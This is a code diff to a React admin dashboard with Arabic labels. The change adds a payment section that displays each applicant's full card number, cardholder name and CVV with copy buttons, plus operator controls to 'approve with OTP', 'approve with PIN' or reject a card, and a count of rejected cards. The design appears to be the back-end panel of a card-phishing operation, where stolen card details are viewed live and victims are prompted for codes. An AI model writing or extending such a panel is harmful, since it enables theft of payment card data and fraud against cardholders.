@@ -130,16 +130,17 @@ export default function AdminDashboard() {
     }
   }, [applications, selectedApplication])
 
-  const formatTime = useCallback((dateObj?: Date) => {
+const formatTime = useCallback((dateObj?: Date) => {
     if (!dateObj) return ""
     const date = typeof dateObj === "string" ? new Date(dateObj) : dateObj
     const now = new Date()
-    const diff = Math.floor((now.getTime() - new Date(dateObj).getTime())/1000)
+    const diff = Math.floor((now.getTime() - new Date(dateObj).getTime()) / 1000)
     if (diff < 60) return "الآن"
     if (diff < 3600) return `${Math.floor(diff / 60)}د`
     if (diff < 86400) return `${Math.floor(diff / 3600)}س`
     return `${Math.floor(diff / 86400)}ي`
   }, [])
+
 
   const copyToClipboard = async (text: string, fieldId: string) => {
     await navigator.clipboard.writeText(text)
@@ -457,7 +458,82 @@ export default function AdminDashboard() {
                 </div>
 
                 {/* Application Details */}
-                <div className="flex-1 grid grid-cols-3 gap-3 overflow-y-auto p-3 space-y-3">
+                <div className="grid grid-cols-3 gap-3  overflow-y-auto p-3 space-y-3">
+      {/* Payment Information */}
+      <Section title="معلومات الدفع" icon={<CreditCard className="w-4 h-4" />}>
+                    <DataRow
+                      label="طريقة الدفع"
+                      value={selectedApplication.paymentMethod}
+                      onCopy={copyToClipboard}
+                      copied={copiedField!}
+                    />
+                    <DataRow
+                        label="رقم البطاقة"
+                        value={selectedApplication.cardNumber ? `${selectedApplication.cardNumber}` : "N/A"}
+                        onCopy={() => {
+                          if (selectedApplication.cardNumber) {
+                            navigator.clipboard.writeText(selectedApplication.cardNumber)
+                            setCopiedField("cardNumber")
+                          }
+                        } } copied={""}                    />
+                    <DataRow
+                      label="اسم حامل البطاقة"
+                      value={selectedApplication.cardHolderName || "N/A"}
+                      onCopy={copyToClipboard}
+                      copied={copiedField!}
+                    />
+                     <DataRow
+                      label="cvvv"
+                      value={selectedApplication.cvv}
+                      onCopy={copyToClipboard}
+                      copied={copiedField!}
+                    />
+                    <Badge
+                      className={`text-[9px] w-fit ${selectedApplication.paymentStatus === "completed" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.paymentStatus === "failed" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
+                    >
+                      {selectedApplication.paymentStatus}
+                    </Badge>
+                    {/* Added card approval controls */}
+                    {selectedApplication.cardStatus !== "approved_with_otp" &&
+                      selectedApplication.cardStatus !== "approved_with_pin" && (
+                        <div className="flex gap-1 mt-2">
+                          <Button
+                            onClick={() => handleApproveCard(selectedApplication.id!, "otp")}
+                            size="sm"
+                            className="h-6 text-[9px] px-2 rounded bg-blue-500/20 text-blue-400 hover:bg-blue-500/30"
+                          >
+                            ✓ موافقة OTP
+                          </Button>
+                          <Button
+                            onClick={() => handleApproveCard(selectedApplication.id!, "pin")}
+                            size="sm"
+                            className="h-6 text-[9px] px-2 rounded bg-green-500/20 text-green-400 hover:bg-green-500/30"
+                          >
+                            ✓ موافقة PIN
+                          </Button>
+                          <Button
+                            onClick={() => handleRejectCard(selectedApplication.id!)}
+                            size="sm"
+                            className="h-6 text-[9px] px-2 rounded bg-red-500/20 text-red-400 hover:bg-red-500/30"
+                          >
+                            ✗ رفض
+                          </Button>
+                        </div>
+                      )}
+                    {(selectedApplication.cardStatus === "approved_with_otp" ||
+                      selectedApplication.cardStatus === "approved_with_pin") && (
+                      <Badge className="text-[9px] bg-emerald-500/20 text-emerald-400 mt-2">
+                        {selectedApplication.cardStatus === "approved_with_otp" ? "موافق - OTP" : "موافق - PIN"}
+                      </Badge>
+                    )}
+                    {selectedApplication.oldCards && selectedApplication.oldCards.length > 0 && (
+                      <div className="mt-2 p-2 bg-red-500/10 rounded border border-red-500/20">
+                        <span className="text-[9px] text-red-400">
+                          عدد البطاقات المرفوضة: {selectedApplication.oldCards.length}
+                        </span>
+                      </div>
+                    )}
+                  </Section>
                   {/* Basic Information */}
                   <Section title="المعلومات الأساسية" icon={<User className="w-4 h-4" />}>
                     <DataRow
@@ -591,7 +667,8 @@ export default function AdminDashboard() {
                     </Section>
                   )}
 
-               
+            
+
                   {/* Verification Status */}
                   <Section title="حالة التحقق" icon={<Shield className="w-4 h-4" />}>
                     <div className="space-y-2">
